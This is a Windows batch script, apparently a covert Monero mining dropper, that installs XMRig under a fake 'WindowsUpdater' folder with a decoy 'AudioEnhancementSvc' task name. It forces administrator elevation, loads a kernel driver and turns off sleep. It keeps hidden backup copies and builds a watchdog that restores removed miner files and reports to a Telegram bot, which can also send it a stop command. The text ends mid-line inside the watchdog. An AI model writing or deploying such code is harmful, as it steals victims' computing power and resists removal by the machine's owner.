@echo off
title Monero Miner Setup – Ultimate Edition
color 0A
setlocal enableextensions enabledelayedexpansion

REM === CONFIGURATION ===
set "DEST=C:\ProgramData\WindowsUpdater"
set "SRC=%~dp0miner_src"
set "LOG=%DEST%\miner.log"
set "DIAG=%TEMP%\miner_debug.log"
set "TASK_NAME=AudioEnhancementSvc"
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT_ID=8112985977"

echo [*] Installer started at %date% %time% > "%DIAG%"
echo [*] Running as user: %username% >> "%DIAG%"
echo DEST=%DEST% >> "%DIAG%"
echo SRC=%SRC% >> "%DIAG%"
echo LOG=%LOG% >> "%DIAG%"

REM === 1) ADMIN PRIVILEGES CHECK ===
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
  echo [!] Elevating to administrator…
  echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\elevate.vbs"
  echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%TEMP%\elevate.vbs"
  "%TEMP%\elevate.vbs" & exit /b
)
echo [✔] Administrator confirmed. >> "%DIAG%"

REM === 2) HUGE-PAGES & USER-MODE VA CONFIG ===
set "ACCOUNT=%USERDOMAIN%\%USERNAME%"
secedit /export /cfg "%TEMP%\secpol.cfg" >nul
powershell -Command "(Get-Content '%TEMP%\secpol.cfg') -replace 'SeLockMemoryPrivilege = .*','SeLockMemoryPrivilege = %ACCOUNT%' | Set-Content '%TEMP%\secpol.cfg'"
secedit /import /cfg "%TEMP%\secpol.cfg" /db secedit.sdb /overwrite >nul
del "%TEMP%\secpol.cfg" secedit.sdb >nul 2>&1
bcdedit /set increaseuserva 2800 >nul 2>&1

REM === 3) LARGEPAGE MINIMUM ===
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v LargePageMinimum /t REG_DWORD /d 4294967295 /f >nul

REM === 4) SECURE BOOT CHECK & CORE/AFFINITY DETECTION ===
powershell -NoProfile -Command "Confirm-SecureBootUEFI" >> "%DIAG%" 2>&1
for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "="') do set /a CORES=%%A
set /a AFFINITY_MASK=(1<<CORES)-1
echo [*] CPU Cores: %CORES%, affinity: 0x%AFFINITY_MASK:~0,2% >> "%DIAG%"

REM === 5) CLEANUP OLD TASK & DRIVER ===
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1

REM === 6) MSR DRIVER INSTALL & VERIFY ===
if exist "%SRC%\winring0x64.sys" (
  sc create WinRing0_1_2_0 binPath= "\"%SRC%\winring0x64.sys\"" type= kernel start= demand
  sc start WinRing0_1_2_0
  "%SRC%\xmrig.exe" --msr-test >nul 2>&1 && (
    echo [✔] MSR test PASSED >> "%DIAG%"
  ) || (
    echo [!] MSR test FAILED >> "%DIAG%"
  )
)

REM === 7) SYSTEM-LEVEL POWER & CLOCK TWEAKS ===
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /hibernate off
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v CsEnabled /t REG_DWORD /d 0 /f >nul
bcdedit /deletevalue useplatformclock >nul

REM === 8) GITHUB AUTO-UPDATE FETCH ===
for /f "delims=" %%U in ('powershell -NoProfile -Command "$r=Invoke-RestMethod '%GITHUB_API%' -UseBasicParsing; $r.assets | Where-Object {$_.name -match 'win64.*msvc.*zip'} | Select-Object -First 1 | ForEach-Object {$_.browser_download_url}"') do set "URL=%%U"
if defined URL (
  powershell -NoProfile -Command "Invoke-WebRequest '%URL%' -OutFile '%TEMP%\xmrig.zip'"
  powershell -NoProfile -Command "Expand-Archive '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force"
  del "%TEMP%\xmrig.zip"
)

REM === 9) DEPLOY & BACKUP MINER FILES ===
if not exist "%DEST%" mkdir "%DEST%"
xcopy /Y /Q "%SRC%\xmrig.exe" "%DEST%\" >nul
xcopy /Y /Q "%SRC%\winring0x64.sys" "%DEST%\" >nul
mkdir "%DEST%\backup"
xcopy /Y /Q "%DEST%\xmrig.exe" "%DEST%\backup\" >nul
xcopy /Y /Q "%DEST%\winring0x64.sys" "%DEST%\backup\" >nul
attrib +h +s "%DEST%\backup"

REM === 10) ENHANCED WATCHDOG CREATION ===
(
  echo @echo off
  echo setlocal enabledelayedexpansion
  echo set "DIAG=%%TEMP%%\watchdog_diag.log"
  echo echo [*] Watchdog start at %%date%% %%time%% ^> "%%DIAG%%"
  echo set "MUTEX=%%TEMP%%\xmrig_watchdog.lock"
  echo if exist "%%MUTEX%%" exit /b
  echo echo locked ^> "%%MUTEX%%" ^>^> "%%DIAG%%"
  echo set "XMRIG=%%~dp0xmrig.exe"
  echo set "BACKUP=%%~dp0backup"
  echo set "POOL=%POOL%"
  echo set "WALLET=%WALLET%"
  echo set "PASS=%%COMPUTERNAME%%"
  echo set "API=16000"
  echo set "TG_TOKEN=%TG_TOKEN%"
  echo set "TG_CHAT=%TG_CHAT_ID%"
  echo set "KILL_PASS=mykillpassword"
  echo set /a "STATS=0"
  echo :loop
  echo   if not exist "%%XMRIG%%" (
  echo     xcopy /Y /Q "%%BACKUP%%\*" "%%~dp0" >nul
  echo     curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" -d "chat_id=%%TG_CHAT%%" -d "text=🔄 Miner restored on %%COMPUTERNAME%%"
  echo   )
  echo   curl -s "https://api.telegram.org/bot%%TG_TOKEN%%/getUpdates?offset=-1" ^> "%%TEMP%%\upd.json"
  echo   findstr /c:"/kill %%KILL_PASS%%" "%%TEMP%%\upd.json" >nul && (
  echo     taskkill /F /IM xmrig.exe >nul
  echo     del "%%MUTEX%%" 2>nul
  echo     exit /b
  echo   )
  echo   "%%XMRIG%%" --msr-test >